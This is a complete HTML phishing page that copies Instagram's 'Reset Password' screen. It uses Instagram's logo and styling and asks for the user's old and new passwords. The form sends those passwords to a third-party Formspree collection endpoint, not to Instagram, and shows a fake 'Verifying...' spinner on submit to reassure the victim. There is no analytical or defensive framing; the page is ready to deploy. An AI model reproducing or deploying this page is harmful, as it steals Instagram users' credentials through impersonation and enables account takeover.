<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password • Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 20px; }
        h2 { color: #262626; font-size: 17px; margin-bottom: 15px; }
        p { font-size: 14px; color: #8e8e8e; line-height: 18px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center; min-height: 30px; }
        button:disabled { background: #b2dffc; cursor: not-allowed; }
        
        /* Loading Spinner CSS */
        .spinner { width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite; margin-right: 8px; display: none; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a251110aa34.png" class="logo" alt="Instagram">
        <h2>Create a Strong Password</h2>
        <p>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters.</p>
        
        <form action="https://formspree.io/f/xykbyoza" method="POST" id="resetForm">
            <input type="password" name="old_password" placeholder="Old Password" required>
            <input type="password" name="new_password" placeholder="New Password" required>
            <input type="password" name="confirm_password" placeholder="New Password Confirmation" required>
            
            <button type="submit" id="submitBtn">
                <div class="spinner" id="loader"></div>
                <span id="btnText">Reset Password</span>
            </button>
        </form>
    </div>

    <script>
        const form = document.getElementById('resetForm');
        const btn = document.getElementById('submitBtn');
        const loader = document.getElementById('loader');
        const btnText = document.getElementById('btnText');

        form.onsubmit = () => {
            // UI Feedback
            btn.disabled = true;
            loader.style.display = 'block';
            btnText.innerText = 'Verifying...';
            
            // The form then submits naturally to Formspree
        };
    </script>
</body>
</html>
